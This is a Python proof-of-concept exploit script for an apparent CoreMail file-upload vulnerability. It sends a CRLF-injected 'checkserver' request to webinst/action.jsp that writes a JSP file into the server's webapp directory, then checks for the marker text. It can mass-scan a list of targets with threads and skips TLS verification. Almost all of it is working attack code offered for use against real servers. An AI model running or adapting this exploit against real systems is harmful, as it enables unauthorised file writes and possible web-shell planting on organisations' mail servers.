import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
from utils import init_db
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list=[]

def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
    return ua

def check_vuln(url):
    try:
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload = "func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/justtest.jsp%20WOSHIHAHAHA"
        url = urljoin(url, 'webinst/action.jsp')
        resp = requests.post(url,data=payload, headers=headers, verify=False)
        if resp.status_code == 200:
            verify_url = urljoin(url, 'coremail/justtest.jsp')
            resp1 = requests.get(verify_url, verify=False)
            if ("WOSHIHAHAHA" in resp1.text):
                print("\033[32m[+]%s is vulnerable\nDownload link:%s\033[0m" % (url, verify_url))
    except Exception as e:
        print ("[-]%s is timeout\033[0m" %url)


def multithreading(url_list, pools=5):
    works = []
    for i in url_list:
        works.append(i)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check_vuln, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

def init_config():
    global args
    init_db()
    arg = ArgumentParser(description='CoreMail Upload Vul')
    arg.add_argument("-u",
					 "--url",
					 help="Target URL; Example:http://ip:port")
    arg.add_argument("-f",
					 "--file",
					 help="Target URL; Example:url.txt")
    args = arg.parse_args()


if __name__ == '__main__':
    show = r'''
   ______                                _ __      __  __      __                __
  / ____/___  ________  ____ ___  ____ _(_) /     / / / /___  / /___  ____ _____/ /
 / /   / __ \/ ___/ _ \/ __ `__ \/ __ `/ / /_____/ / / / __ \/ / __ \/ __ `/ __  / 
/ /___/ /_/ / /  /  __/ / / / / / /_/ / / /_____/ /_/ / /_/ / / /_/ / /_/ / /_/ /  
\____/\____/_/   \___/_/ /_/ /_/\__,_/_/_/      \____/ .___/_/\____/\__,_/\__,_/   
                                                    /_/     
	'''
    print(show + '\n')
    print("Load Poc............. wait")
    init_config()
    url = args.url
    filename= args.file
    start = time()
    if url != None and filename == None:
        check_vuln(url)
    elif url == None and filename != None:
        for i in open(filename):
            i = i.replace('\n','')
            url_list.append(i)
        multithreading(url_list,10)
    end = time()
    print('Task Suceess，Use Time%d' %(end-start))
